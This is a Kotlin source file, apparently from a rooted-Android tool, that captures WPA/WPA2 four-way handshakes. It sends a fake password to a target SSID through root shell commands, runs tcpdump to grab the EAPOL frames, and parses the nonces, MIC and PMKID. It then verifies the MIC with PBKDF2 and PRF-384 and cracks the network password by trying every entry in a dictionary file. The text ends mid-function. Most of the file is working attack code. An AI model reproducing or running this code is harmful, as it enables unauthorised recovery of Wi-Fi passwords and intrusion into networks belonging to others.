package com.whmdg.mczj.tools.capture

import android.content.Context
import com.whmdg.mczj.tools.security.SpecialPermissionVerifier
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.DataInputStream
import javax.crypto.Mac
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec
import javax.crypto.SecretKeyFactory

/**
 * WiFi 四次握手抓包器
 * 通过 tcpdump 抓取 EAPOL 帧，解析 WPA/WPA2 四次握手数据
 */
object HandshakeCapture {

    /**
     * 四次握手数据
     * 所有 hex 字段均为小写无分隔符格式，可直接用于离线计算
     */
    data class HandshakeData(
        val ssid: String,
        val bssid: String,              // AP MAC (AA:BB:CC:DD:EE:FF)
        val clientMac: String,          // STA MAC
        val aNonce: String,             // ANonce hex (64 字符 = 32 字节)
        val sNonce: String,             // SNonce hex (64 字符 = 32 字节)
        val mic: String,                // MIC hex (32 字符 = 16 字节)
        val pmkid: String?,             // PMKID hex (可选)
        val keyVersion: Int,            // 1=RC4-MD5, 2=HMAC-SHA1, 3=HMAC-SHA256
        val keyInfo: Int,               // 原始 Key Info 字段
        val keyLen: Int,                // Key Length 字段
        val keyDescriptor: Int,         // Key Descriptor Type (2=RSN, 254=WPA)
        val eapolVersion: Int,          // 802.1X 版本
        val eapolFrames: List<String>,  // 各帧完整 EAPOL 数据 hex
        val rawPcapB64: String? = null, // 调试模式: 原始 pcap base64 数据
        val rawPcapSize: Int = 0        // 调试模式: pcap 字节数
    )

    /**
     * 解析后的单个 EAPOL 帧（完整保留所有字段，供离线计算使用）
     */
    private data class EapolFrame(
        val srcMac: String,
        val dstMac: String,
        val eapolVersion: Int,          // 802.1X 版本
        val eapolLen: Int,              // 802.1X 长度
        val descriptor: Int,            // Key Descriptor Type (2=RSN, 254=WPA)
        val keyInfo: Int,               // Key Info 字段
        val keyLen: Int,                // Key Length
        val replayCounter: Long,        // Replay Counter (用于配对同一次握手)
        val nonce: ByteArray,           // 32 字节
        val mic: ByteArray,             // 16 字节
        val keyData: ByteArray,         // 含 RSN IE 等
        val rawEapol: ByteArray,        // 完整 EAPOL 帧原始数据
        val msgType: Int                // 1=Msg1, 2=Msg2, 3=Msg3, 4=Msg4
    )

    /**
     * 完整抓包流程
     *
     * @param iface 监听模式的接口名
     * @param targetSsid 目标 AP 的 SSID
     * @param targetBssid 目标 AP 的 BSSID（可选）
     * @param fakePassword 假密码（触发握手用）
     * @param onProgress 进度回调
     * @return 握手数据，抓包失败返回 null
     */
    suspend fun captureHandshake(
        context: Context,
        iface: String,
        targetSsid: String,
        targetBssid: String?,
        fakePassword: String = "12345678",
        debugRaw: Boolean = false,
        onProgress: (String) -> Unit
    ): HandshakeData? = withContext(Dispatchers.IO) {
        onProgress("启动 tcpdump（普通模式）...")

        // 1. 启动 tcpdump，管道输出 base64 到 stdout，内存处理不写物理存储
        //    -c 4: 一次四次握手最多 4 帧，避免抓到重试的冗余帧
        val tcpdumpCmd = "tcpdump -i $iface -c 4 -w - ether proto 0x888e | base64"
        val tcpdumpProcess = try {
            Runtime.getRuntime().exec(arrayOf("su", "-c", tcpdumpCmd))
        } catch (e: Exception) {
            onProgress("启动 tcpdump 失败: ${e.message}")
            return@withContext null
        }

        // 后台读取 stdout（base64 编码的 pcap 数据）
        val stdoutBuf = StringBuilder()
        val stderrBuf = StringBuilder()
        val stdoutThread = Thread {
            try {
                tcpdumpProcess.inputStream.bufferedReader(Charsets.UTF_8).useLines { lines ->
                    lines.forEach { stdoutBuf.appendLine(it) }
                }
            } catch (_: Exception) {}
        }.apply { start() }
        val stderrThread = Thread {
            try {
                tcpdumpProcess.errorStream.bufferedReader(Charsets.UTF_8).useLines { lines ->
                    lines.forEach { stderrBuf.appendLine(it) }
                }
            } catch (_: Exception) {}
        }.apply { start() }

        delay(500) // 等待 tcpdump 就绪

        // 记录触发前已保存的网络列表，用于后续清理新增的假密码网络
        val existingNetworks = getSavedNetworkIds()

        try {
            // 2. 发送假密码触发握手（自己发包自己抓）
            onProgress("发送认证请求触发握手...")
            val connectCmd = "cmd wifi connect-network \"$targetSsid\" wpa2 \"$fakePassword\""
            SpecialPermissionVerifier.executeRootCommandFull(connectCmd)

            // 3. 等待 tcpdump 完成（-c 10 抓满自动停止，或 20 秒超时）
            onProgress("等待握手包...")
            val maxWait = 20_000L
            val start = System.currentTimeMillis()
            while (System.currentTimeMillis() - start < maxWait) {
                try {
                    tcpdumpProcess.exitValue()
                    break // 已自然退出
                } catch (_: IllegalThreadStateException) {
                    delay(500)
                    // stderr 有输出时显示进度
                    val err = stderrBuf.toString()
                    if (err.isNotEmpty()) {
                        val lastLine = err.trim().lines().lastOrNull() ?: ""
                        if (lastLine.contains("packet", ignoreCase = true)) {
                            onProgress("抓包中: $lastLine")
                        }
                    }
                }
            }

            // 超时则 kill
            try {
                tcpdumpProcess.exitValue()
            } catch (_: IllegalThreadStateException) {
                onProgress("超时，停止抓包...")
                val pid = getPid(tcpdumpProcess)
                if (pid > 0) {
                    SpecialPermissionVerifier.executeRootCommandFull("kill -2 $pid")
                }
                stdoutThread.join(3000)
                stderrThread.join(1000)
            }

            // 4. 解析内存中的 pcap 数据
            onProgress("解析握手数据...")
            val b64Data = stdoutBuf.toString().replace("\n", "").replace("\r", "").trim()
            if (b64Data.isEmpty()) {
                onProgress("未捕获到 EAPOL 帧")
                return@withContext null
            }

            val rawData = try {
                android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT)
            } catch (_: Exception) {
                onProgress("解码 pcap 数据失败")
                return@withContext null
            }
            if (rawData.size < 24) {
                onProgress("pcap 数据不完整")
                return@withContext null
            }

            // debugRaw 模式：解析后把原始数据附在 HandshakeData 上
            val debugB64 = if (debugRaw) b64Data else null
            val debugSize = if (debugRaw) rawData.size else 0

            val frames = parsePcapBytes(rawData, onProgress)
            if (frames.isEmpty()) {
                if (debugRaw) {
                    // debug 模式下即使解析失败也返回原始数据
                    onProgress("pcap 数据已捕获，但未解析到 EAPOL 帧")
                    return@withContext HandshakeData(
                        ssid = targetSsid, bssid = "", clientMac = "",
                        aNonce = "", sNonce = "", mic = "", pmkid = null,
                        keyVersion = 0, keyInfo = 0, keyLen = 0, keyDescriptor = 0,
                        eapolVersion = 0, eapolFrames = emptyList(),
                        rawPcapB64 = debugB64, rawPcapSize = debugSize
                    )
                }
                onProgress("未捕获到 EAPOL 帧")
                return@withContext null
            }

            // 5. 提取握手数据
            onProgress("提取握手数据...")
            val bssid = targetBssid ?: frames.firstOrNull()?.srcMac ?: ""

            extractHandshake(frames, targetSsid, bssid, debugB64, debugSize)
        } catch (e: Exception) {
            onProgress("抓包异常: ${e.message}")
            try {
                val pid = getPid(tcpdumpProcess)
                if (pid > 0) SpecialPermissionVerifier.executeRootCommandFull("kill -2 $pid")
            } catch (_: Exception) {}
            null
        } finally {
            // 清理系统保存的假密码网络，避免污染 WiFi 设置
            cleanupFakeNetwork(targetSsid, existingNetworks)
        }
    }

    /**
     * 获取当前已保存的网络 ID 列表（用于对比新增网络）
     */
    private fun getSavedNetworkIds(): Set<String> {
        val (stdout, _, exitCode) = SpecialPermissionVerifier.executeRootCommandFull("cmd wifi list-networks")
        if (exitCode != 0) return emptySet()
        // 输出格式: "NetworkId  SSID  Security" 每行一个网络
        return stdout.lines()
            .drop(1) // 跳过表头
            .mapNotNull { line ->
                val parts = line.trim().split("\\s+".toRegex(), limit = 2)
                parts.firstOrNull()?.takeIf { it.isNotEmpty() }
            }
            .toSet()
    }

    /**
     * 清理 connect-network 新增的假密码网络
     * 对比抓包前后的网络列表，移除新增的匹配 SSID 的网络
     */
    private fun cleanupFakeNetwork(targetSsid: String, existingNetworks: Set<String>) {
        try {
            val (stdout, _, exitCode) = SpecialPermissionVerifier.executeRootCommandFull("cmd wifi list-networks")
            if (exitCode != 0) return
            stdout.lines().drop(1).forEach { line ->
                val parts = line.trim().split("\\s+".toRegex(), limit = 3)
                if (parts.size >= 2) {
                    val networkId = parts[0]
                    val ssid = parts[1]
                    // 只删除新增的（不在抓包前列表中）且 SSID 匹配的网络
                    if (networkId !in existingNetworks && ssid == targetSsid) {
                        SpecialPermissionVerifier.executeRootCommandFull("cmd wifi remove-network $networkId")
                    }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * 获取进程 PID（通过反射）
     */
    private fun getPid(process: Process): Int {
        return try {
            val pidField = process.javaClass.getDeclaredField("pid")
            pidField.isAccessible = true
            pidField.getInt(process)
        } catch (_: Exception) {
            try {
                val (stdout, _, _) = SpecialPermissionVerifier.executeRootCommandFull("pidof tcpdump")
                stdout.trim().split("\\s+".toRegex()).lastOrNull()?.toIntOrNull() ?: -1
            } catch (_: Exception) { -1 }
        }
    }

    /**
     * pcap 链路层类型
     */
    private enum class LinkType(val value: Int) {
        ETHERNET(1),
        IEEE802_11(105),
        RADIOTAP(127),
        IEEE802_11_PRISM(119),
        LINUX_SLL(113);

        companion object {
            fun fromInt(value: Int) = entries.firstOrNull { it.value == value } ?: ETHERNET
        }
    }

    /**
     * 解析内存中的 pcap 字节数据，提取 EAPOL 帧
     */
    private fun parsePcapBytes(rawData: ByteArray, onProgress: (String) -> Unit = {}): List<EapolFrame> {
        val frames = mutableListOf<EapolFrame>()
        try {
            DataInputStream(rawData.inputStream()).use { dis ->
                // 读取全局头 (24 bytes)
                val magic = dis.readInt()
                if (magic != 0xa1b2c3d4.toInt() && magic != 0xd4c3b2a1.toInt()) {
                    onProgress("[DEBUG] 无效 pcap magic: 0x${"%08x".format(magic)}")
                    return frames
                }
                val swapped = (magic == 0xd4c3b2a1.toInt())
                // 读取剩余全局头，提取 link type (bytes 20-23)
                val restHeader = readBytes(dis, 20)
                val linkType = readUint32(restHeader, 16, swapped).toInt()
                val link = LinkType.fromInt(linkType)
                onProgress("[DEBUG] pcap linkType=$linkType ($link), swapped=$swapped")

                // 逐个读取包
                while (true) {
                    val pktHeader = try { readBytes(dis, 16) } catch (_: Exception) { break }
                    if (pktHeader.size < 16) break

                    val inclLen = readUint32(pktHeader, 8, swapped)
                    if (inclLen > 65535 || inclLen < 0) break

                    val pktData = try { readBytes(dis, inclLen.toInt()) } catch (_: Exception) { break }
                    if (pktData.size < inclLen.toInt()) break

                    // 根据链路层类型解析 EAPOL 帧
                    val frame = parseEapolFrame(pktData, link, onProgress)
                    if (frame != null) {
                        frames.add(frame)
                    }
                }
            }
        } catch (_: Exception) {}

        return frames
    }

    /**
     * 从原始包数据中解析 EAPOL 帧
     *
     * 支持两种链路层：
     * - Ethernet II: [dst 6B][src 6B][ethertype 2B][802.1X][EAPOL-Key]
     * - IEEE 802.11: [FC 2B][Dur 2B][Addr1-3 可变][QoS 可变][LLC/SNAP 8B][802.1X][EAPOL-Key]
     *
     * 802.1X header: [version 1B] [type 1B] [length 2B]
     * EAPOL-Key: [descriptor 1B] [key_info 2B] [key_len 2B] [replay_counter 8B]
     *            [nonce 32B] [key_iv 16B] [key_rsc 8B] [key_id 8B] [mic 16B]
     *            [key_data_len 2B] [key_data ...]
     */
    private fun parseEapolFrame(data: ByteArray, linkType: LinkType, onProgress: (String) -> Unit = {}): EapolFrame? {
        return when (linkType) {
            LinkType.ETHERNET -> parseEthernetEapol(data, onProgress)
            LinkType.IEEE802_11, LinkType.RADIOTAP, LinkType.IEEE802_11_PRISM -> parse80211Eapol(data, linkType, onProgress)
            LinkType.LINUX_SLL -> parseLinuxSllEapol(data, onProgress)
        }
    }

    /**
     * 解析 Ethernet II 链路层的 EAPOL 帧
     */
    private fun parseEthernetEapol(data: ByteArray, onProgress: (String) -> Unit): EapolFrame? {
        // 最小长度: 14(eth) + 4(802.1x) + 95(eapol-key头) = 113
        if (data.size < 113) return null

        val dstMac = formatMac(data, 0)
        val srcMac = formatMac(data, 6)
        val ethertype = ((data[12].toInt() and 0xFF) shl 8) or (data[13].toInt() and 0xFF)
        if (ethertype != 0x888E) return null

        val eapolStart = 14
        return parseEapolKeyFrame(data, eapolStart, srcMac, dstMac, onProgress)
    }

    /**
     * 解析 Linux SLL (Linux cooked capture) 链路层的 EAPOL 帧
     * SLL 头部: 16 字节 [pkt_type 2B][ARPHRD 2B][addr_len 2B][addr 8B][proto 2B]
     */
    private fun parseLinuxSllEapol(data: ByteArray, onProgress: (String) -> Unit): EapolFrame? {
        // 最小长度: 16(sll) + 4(802.1x) + 95(eapol-key头) = 115
        if (data.size < 115) return null

        val proto = ((data[14].toInt() and 0xFF) shl 8) or (data[15].toInt() and 0xFF)
        if (proto != 0x888E) return null

        // SLL 地址字段 (bytes 6-13) 中取 MAC（取前 6 字节作为源地址）
        val srcMac = formatMac(data, 6)
        val dstMac = "ff:ff:ff:ff:ff:ff" // SLL 不含目标 MAC

        val eapolStart = 16
        return parseEapolKeyFrame(data, eapolStart, srcMac, dstMac, onProgress)
    }

    /**
     * 解析 802.11 链路层的 EAPOL 帧
     * 扫描 0x888e ethertype 定位 EAPOL 帧起始位置，避免处理复杂的 802.11 头部变长
     */
    private fun parse80211Eapol(data: ByteArray, linkType: LinkType, onProgress: (String) -> Unit): EapolFrame? {
        // RadioTap 头部是变长的（bytes 2-3 为长度字段），需要先跳过
        val dot11Start = when (linkType) {
            LinkType.RADIOTAP -> {
                if (data.size < 4) return null
                val rtLen = (data[2].toInt() and 0xFF) or ((data[3].toInt() and 0xFF) shl 8)
                if (rtLen < 8 || rtLen >= data.size) return null
                rtLen
            }
            else -> 0
        }

        if (dot11Start + 24 > data.size) return null

        // 提取 802.11 Frame Control 字段
        val frameControl = ((data[dot11Start].toInt() and 0xFF)) or
                ((data[dot11Start + 1].toInt() and 0xFF) shl 8)
        val fcType = (frameControl shr 2) and 0x3
        val fcSubtype = (frameControl shr 4) and 0xF

        // 只处理 Data 帧 (type=2)
        if (fcType != 2) return null

        // 判断是否有 QoS Control 字段（Data subtype bit 7 = 1 表示 QoS Data）
        val hasQos = (fcSubtype and 0x08) != 0
        val baseHeaderSize = dot11Start + if (hasQos) 26 else 24

        // 全文扫描 LLC/SNAP + 0x888e 定位 EAPOL 帧
        val eapolOffset = find80211EapolOffset(data, baseHeaderSize)
        if (eapolOffset < 0) return null

        // 从 802.11 头部提取 MAC 地址（相对 dot11Start）
        val toDs = (frameControl shr 8) and 0x1
        val fromDs = (frameControl shr 9) and 0x1
        val srcMac: String
        val dstMac: String
        when {
            toDs == 0 && fromDs == 0 -> {
                dstMac = formatMac(data, dot11Start + 4)
                srcMac = formatMac(data, dot11Start + 10)
            }
            toDs == 1 && fromDs == 0 -> {
                srcMac = formatMac(data, dot11Start + 10)
                dstMac = formatMac(data, dot11Start + 16)
            }
            toDs == 0 && fromDs == 1 -> {
                dstMac = formatMac(data, dot11Start + 4)
                srcMac = formatMac(data, dot11Start + 16)
            }
            else -> {
                dstMac = formatMac(data, dot11Start + 24)
                srcMac = formatMac(data, dot11Start + 30)
            }
        }

        return parseEapolKeyFrame(data, eapolOffset, srcMac, dstMac, onProgress)
    }

    /**
     * 在 802.11 帧中扫描 0x888e ethertype 标记
     * 返回 EAPOL 帧起始偏移（802.1X header 的 version 字段位置），未找到返回 -1
     */
    private fun find80211EapolOffset(data: ByteArray, searchStart: Int): Int {
        // 802.11 帧后面是 LLC/SNAP 头部（8 字节），最后 2 字节是 ethertype
        // 可能有 CCMP 加密头（8 字节）或 TKIP 头
        // 扫找 0x888e 模式：[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]
        val llcSnap = byteArrayOf(0xAA.toByte(), 0xAA.toByte(), 0x03, 0x00, 0x00, 0x00, 0x88.toByte(), 0x8E.toByte())

        // 先尝试标准 LLC/SNAP 位置
        var offset = searchStart
        if (offset + 8 <= data.size && data.copyOfRange(offset, offset + 8).contentEquals(llcSnap)) {
            return offset + 8 // 跳过 LLC/SNAP，指向 802.1X header
        }

        // 尝试带 CCMP 头（+8 字节）
        offset = searchStart + 8
        if (offset + 8 <= data.size && data.copyOfRange(offset, offset + 8).contentEquals(llcSnap)) {
            return offset + 8
        }

        // 全文扫描 0x888e 作为兜底
        for (i in searchStart until (data.size - 8).coerceAtLeast(0)) {
            if (data[i + 6].toInt() and 0xFF == 0x88 && data[i + 7].toInt() and 0xFF == 0x8E) {
                // 验证前 6 字节是否是 LLC/SNAP
                if (data[i].toInt() and 0xFF == 0xAA && data[i + 1].toInt() and 0xFF == 0xAA &&
                    data[i + 2].toInt() and 0xFF == 0x03) {
                    return i + 8
                }
            }
        }

        return -1
    }

    /**
     * 解析 802.1X + EAPOL-Key 帧
     *
     * @param data 原始包数据
     * @param eapolStart 802.1X header 在 data 中的起始偏移
     * @param srcMac 源 MAC（已格式化）
     * @param dstMac 目标 MAC（已格式化）
     */
    private fun parseEapolKeyFrame(
        data: ByteArray,
        eapolStart: Int,
        srcMac: String,
        dstMac: String,
        onProgress: (String) -> Unit
    ): EapolFrame? {
        // 802.1X header (4 bytes) + EAPOL-Key header (95 bytes)
        if (eapolStart + 99 > data.size) return null

        // 802.1X header
        val eapolVersion = data[eapolStart].toInt() and 0xFF
        val eapolType = data[eapolStart + 1].toInt() and 0xFF
        if (eapolType != 3) return null // 不是 EAPOL-Key (type=3)
        val eapolLen = ((data[eapolStart + 2].toInt() and 0xFF) shl 8) or
                (data[eapolStart + 3].toInt() and 0xFF)

        // EAPOL-Key 头部
        val keyOffset = eapolStart + 4
        val descriptor = data[keyOffset].toInt() and 0xFF           // Key Descriptor Type
        val keyInfo = ((data[keyOffset + 1].toInt() and 0xFF) shl 8) or
                (data[keyOffset + 2].toInt() and 0xFF)
        val keyLen = ((data[keyOffset + 3].toInt() and 0xFF) shl 8) or
                (data[keyOffset + 4].toInt() and 0xFF)

        // replay counter: 8 bytes at offset keyOffset+5
        var replayCounter = 0L
        for (i in 0 until 8) {
            replayCounter = (replayCounter shl 8) or (data[keyOffset + 5 + i].toLong() and 0xFF)
        }

        // nonce: 32 bytes at offset keyOffset+13
        val nonce = data.copyOfRange(keyOffset + 13, keyOffset + 45)

        // MIC: 16 bytes at offset keyOffset+77
        val mic = data.copyOfRange(keyOffset + 77, keyOffset + 93)

        // Key Data Length: 2 bytes at offset keyOffset+93
        val keyDataLen = ((data[keyOffset + 93].toInt() and 0xFF) shl 8) or
                (data[keyOffset + 94].toInt() and 0xFF)

        // Key Data
        val keyDataStart = keyOffset + 95
        val keyData = if (keyDataStart + keyDataLen <= data.size) {
            data.copyOfRange(keyDataStart, keyDataStart + keyDataLen)
        } else ByteArray(0)

        // 完整 EAPOL 帧原始数据（去掉链路层头部，从 802.1X header 开始）
        val rawEapol = data.copyOfRange(eapolStart, data.size)

        // 判断消息类型 (基于 Key Info 的 ACK/MIC 位)
        val isAck = keyInfo and 0x0080 != 0
        val isMic = keyInfo and 0x0100 != 0
        val msgType = when {
            isAck && !isMic -> 1      // Msg1: AP→STA, ACK, no MIC
            !isAck && isMic -> 2      // Msg2: STA→AP, MIC, no ACK
            isAck && isMic -> 3       // Msg3: AP→STA, ACK + MIC
            else -> 4                  // Msg4: STA→AP, no ACK, no MIC
        }

        return EapolFrame(
            srcMac = srcMac,
            dstMac = dstMac,
            eapolVersion = eapolVersion,
            eapolLen = eapolLen,
            descriptor = descriptor,
            keyInfo = keyInfo,
            keyLen = keyLen,
            replayCounter = replayCounter,
            nonce = nonce,
            mic = mic,
            keyData = keyData,
            rawEapol = rawEapol,
            msgType = msgType
        )
    }

    /**
     * 从 EAPOL 帧列表中提取握手数据
     * 严格按 replay counter 配对 Msg1/Msg2，确保来自同一次握手
     */
    private fun extractHandshake(
        frames: List<EapolFrame>,
        ssid: String,
        bssid: String,
        rawPcapB64: String? = null,
        rawPcapSize: Int = 0
    ): HandshakeData? {
        // 找到第一对匹配的 Msg1 + Msg2（replay counter 相同）
        val msg1 = frames.find { it.msgType == 1 } ?: return null
        val msg2 = frames.find {
            it.msgType == 2 && it.replayCounter == msg1.replayCounter
        } ?: return null

        // Msg3 也必须 replay counter 匹配，否则是另一次握手的，不用
        val msg3 = frames.find {
            it.msgType == 3 && it.replayCounter == msg1.replayCounter
        }

        // ANonce: 优先 Msg3（AP 确认），否则 Msg1
        val aNonce = (msg3 ?: msg1).nonce.toHex()

        // SNonce: 来自 Msg2
        val sNonce = msg2.nonce.toHex()

        // MIC: 来自 Msg2
        val mic = msg2.mic.toHex()

        // PMKID: 从 Msg1 的 RSN IE 中提取（如有）
        val pmkid = extractPmkid(msg1.keyData)

        // Key Descriptor Version
        val keyVersion = msg1.keyInfo and 0x0007

        // 额外字段（供离线计算使用）
        val keyLen = msg1.keyLen
        val keyDescriptor = msg1.descriptor
        val eapolVersion = msg1.eapolVersion

        // BSSID: AP 的 MAC（Msg1 的源地址）
        val apMac = msg1.srcMac

        // 客户端 MAC: Msg2 的源地址
        val clientMac = msg2.srcMac

        // eapolFrames 存储原始帧（含真实 MIC），供离线工具使用
        val handshakeFrames = listOf(msg1, msg2) + listOfNotNull(msg3)
        val eapolHexList = handshakeFrames.map { it.rawEapol.toHex() }

        return HandshakeData(
            ssid = ssid,
            bssid = apMac,
            clientMac = clientMac,
            aNonce = aNonce,
            sNonce = sNonce,
            mic = mic,
            pmkid = pmkid,
            keyVersion = keyVersion,
            keyInfo = msg1.keyInfo,
            keyLen = keyLen,
            keyDescriptor = keyDescriptor,
            eapolVersion = eapolVersion,
            eapolFrames = eapolHexList,
            rawPcapB64 = rawPcapB64,
            rawPcapSize = rawPcapSize
        )
    }

    /**
     * 从 RSN IE 中提取 PMKID
     * PMKID 在 RSN IE 的 PMKID List 字段中（最后 16 字节，如有）
     */
    private fun extractPmkid(keyData: ByteArray): String? {
        if (keyData.size < 22) return null
        try {
            // 遍历 IE 寻找 RSN IE (ID=48)
            var offset = 0
            while (offset + 1 < keyData.size) {
                val ieId = keyData[offset].toInt() and 0xFF
                val ieLen = keyData[offset + 1].toInt() and 0xFF
                if (ieId == 48 && ieLen >= 20 && offset + 2 + ieLen <= keyData.size) {
                    // RSN IE: [id][len][version2][group cipher][pairwise count][pairwise...][akm count][akm...][capabilities][pmkid count][pmkid...]
                    val rsnData = keyData.copyOfRange(offset + 2, offset + 2 + ieLen)
                    // PMKID Count 在 capabilities 之后
                    if (rsnData.size >= 20) {
                        val pmkidCountOffset = rsnData.size - 16
                        if (pmkidCountOffset >= 2) {
                            val pmkidCount = ((rsnData[pmkidCountOffset - 2].toInt() and 0xFF) shl 8) or
                                    (rsnData[pmkidCountOffset - 1].toInt() and 0xFF)
                            if (pmkidCount > 0 && rsnData.size >= pmkidCountOffset + 16) {
                                return rsnData.copyOfRange(pmkidCountOffset, pmkidCountOffset + 16).toHex()
                            }
                        }
                    }
                }
                offset += 2 + ieLen
            }
        } catch (_: Exception) {}
        return null
    }

    // ── WPA2 MIC 验证 ──

    /**
     * 验证 WPA2 四次握手 MIC
     * 流程：password → PBKDF2-SHA1 → PMK → PRF-384 → PTK → KCK → HMAC-SHA1(MIC)
     *
     * @param handshake 握手数据
     * @param password 待验证的密码
     * @return 验证结果，包含各步骤中间值和最终匹配结果
     */
    data class MicVerifyResult(
        val pmk: String,
        val ptk: String,
        val kck: String,
        val computedMic: String,
        val expectedMic: String,
        val matched: Boolean,
        val error: String? = null
    )

    fun verifyWpa2Mic(handshake: HandshakeData, password: String): MicVerifyResult {
        try {
            // 1. PMK = PBKDF2-SHA1(password, SSID, 4096, 32)
            val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1")
            val spec = PBEKeySpec(
                password.toCharArray(),
                handshake.ssid.toByteArray(Charsets.UTF_8),
                4096,
                256 // 32 bytes = 256 bits
            )
            val pmk = factory.generateSecret(spec).encoded

            // 2. PTK = PRF-384(PMK, "Pairwise key expansion", min/max(MACs) + min/max(nonces))
            val bssidBytes = macToBytes(handshake.bssid)
            val clientBytes = macToBytes(handshake.clientMac)
            val aNonceBytes = hexToBytes(handshake.aNonce)
            val sNonceBytes = hexToBytes(handshake.sNonce)

            // 确定 min/max 顺序
            val mac1: ByteArray
            val mac2: ByteArray
            if (compareBytes(bssidBytes, clientBytes) <= 0) {
                mac1 = bssidBytes; mac2 = clientBytes
            } else {
                mac1 = clientBytes; mac2 = bssidBytes
            }
            val nonce1: ByteArray
            val nonce2: ByteArray
            if (compareBytes(aNonceBytes, sNonceBytes) <= 0) {
                nonce1 = aNonceBytes; nonce2 = sNonceBytes
            } else {
                nonce1 = sNonceBytes; nonce2 = aNonceBytes
            }

            val label = "Pairwise key expansion".toByteArray(Charsets.UTF_8)
            // PRF-384 输入模板: label + X + mac1 + mac2 + nonce1 + nonce2 + X
            // X 在每次迭代中替换为计数器 0/1/2
            val prfTemplate = label + 0.toByte() + mac1 + mac2 + nonce1 + nonce2 + 0.toByte()
            val ptk = prf384(pmk, prfTemplate)

            // 3. KCK = PTK[0:16]
            val kck = ptk.copyOfRange(0, 16)

            // 4. 计算 MIC = HMAC-SHA1(KCK, EAPOL_frame_with_MIC_zeroed)
            // eapolFrames[1] 是 Msg2（hex 字符串），需要转为字节并置零 MIC 区域
            val msg2Index = handshake.eapolFrames.indexOfFirst { idx ->
                // Msg2 是第二帧（index 1），但保险起见通过 HandshakeData 的结构确认
                true
            }.takeIf { it >= 0 } ?: 1
            if (msg2Index >= handshake.eapolFrames.size) {
                return MicVerifyResult(pmk.toHex(), ptk.toHex(), kck.toHex(), "", handshake.mic, false, "无 Msg2 帧")
            }

            val msg2Bytes = hexToBytes(handshake.eapolFrames[msg2Index])
            // EAPOL-Key MIC 在 EAPOL 帧中的偏移: 4(802.1X头) + 77(MIC在Key Descriptor中的偏移) = 81
            val micOffsetInEapol = 81
            if (msg2Bytes.size < micOffsetInEapol + 16) {
                return MicVerifyResult(pmk.toHex(), ptk.toHex(), kck.toHex(), "", handshake.mic, false, "Msg2 帧太短")
            }

            // 置零 MIC 区域
            val zeroedMsg2 = msg2Bytes.copyOf()
            for (i in micOffsetInEapol until micOffsetInEapol + 16) {
                zeroedMsg2[i] = 0
            }

            val mac = Mac.getInstance("HmacSHA1")
            mac.init(SecretKeySpec(kck, "HmacSHA1"))
            val computedMic = mac.doFinal(zeroedMsg2).copyOfRange(0, 16)

            val computedMicHex = computedMic.toHex()
            val expectedMicHex = handshake.mic
            val matched = computedMicHex == expectedMicHex

            return MicVerifyResult(
                pmk = pmk.toHex(),
                ptk = ptk.toHex(),
                kck = kck.toHex(),
                computedMic = computedMicHex,
                expectedMic = expectedMicHex,
                matched = matched
            )
        } catch (e: Exception) {
            return MicVerifyResult("", "", "", "", handshake.mic, false, e.message)
        }
    }

    /**
     * 字典破解：遍历字典文件中的密码，逐个验证 MIC
     *
     * @param handshake 握手数据
     * @param dictPath 字典文件路径（每行一个密码）
     * @param onProgress 进度回调 (当前序号, 总数, 当前密码)
     * @return 匹配的密码，未找到返回 null
     */
    suspend fun crackWithDictionary(
        handshake: HandshakeData,
        dictPath: String,
        onProgress: (Int, Int, String) -> Unit
    ): String? = withContext(Dispatchers.IO) {
        val file = java.io.File(dictPath)
        if (!file.exists()) return@withContext null

        val passwords = file.readLines()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
        val total = passwords.size
        if (total == 0) return@withContext null

        // 预计算 PMK 需要的固定参数（PBKDF2 最慢，每个密码都要算）
        for ((index, pwd) in passwords.withIndex()) {
            onProgress(index + 1, total, pwd)
            val result = verifyWpa2Mic(handshake, pwd)
            if (result.matched) {
                return@withContext pwd
            }
        }
        null
    }

    /**
     * PRF-384: WPA2 PRF 函数
     * PRF-X(K, A, B) = HMAC-SHA1(K, A || 0x00 || B || 0x00)[0:X/8]
     * 其中 A = "Pairwise key expansion", B = min(MACs) || max(MACs) || min(nonces) || max(nonces)
     *
     * 模板: label(22B) + 0x00 + mac1(6B) + mac2(6B) + nonce1(32B) + nonce2(32B) + 0x00 = 100B
     * 计数器替换 label 后的 0x00 和最后的 0x00
     */
    private fun prf384(pmk: ByteArray, template: ByteArray): ByteArray {
        val result = ByteArray(48)
        val mac = Mac.getInstance("HmacSHA1")
        mac.init(SecretKeySpec(pmk, "HmacSHA1"))
        // template[label.size] 是第一个 0x00，template[template.size-1] 是最后一个 0x00
        // 计数器替换这两个位置
        for (i in 0..2) {
            val input = template.copyOf()
            input[22] = i.toByte()          // label 后的计数器
            input[input.size - 1] = i.toByte() // 末尾的计数器
            val hash = mac.doFinal(input)
            System.arraycopy(hash, 0, result, i * 20, minOf(20, 48 - i * 20))
        }
        return result
    }

    private fun macToBytes(mac: String): ByteArray {
        return mac.split(":").map { it.toInt(16).toByte() }.toByteArray()
    }

    private fun hexToBytes(hex: String): ByteArray {
        val result = ByteArray(hex.length / 2)
        for (i in result.indices) {
            result[i] = hex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        return result
    }

    private fun compareBytes(a: ByteArray, b: ByteArray): Int {
        for (i in a.indices) {
            val diff = (a[i].toInt() and 0xFF) - (b[i].toInt() and 0xFF)
            if (diff != 0) return diff
        }
        return 0
    }

    // ── 工具方法 ──

    private fun readBytes(dis: DataInputStream, count: Int): ByteArray {
        val buf = ByteArray(count)
        dis.readFully(buf)
        return buf
    }

    private fun readUint32(data: ByteArray, offset: Int, swapped: Boolean): Long {
        return if (swapped) {
            ((data[offset].toLong() and 0xFF) or
                    ((data[offset + 1].toLong() and 0xFF) shl 8) or
                    ((data[offset + 2].toLong() and 0xFF) shl 16) or
                    ((data[offset + 3].toLong() and 0xFF) shl 24))
        } else {
            (((data[offset].toLong() and 0xFF) shl 24) or
                    ((data[offset + 1].toLong() and 0xFF) shl 16) or
                    ((data[offset + 2].toLong() and 0xFF) shl 8) or
                    (data[offset + 3].toLong() and 0xFF))
        }
    }

    private fun formatMac(data: ByteArray, offset: Int): String {
        return (offset until offset + 6).joinToString(":") {
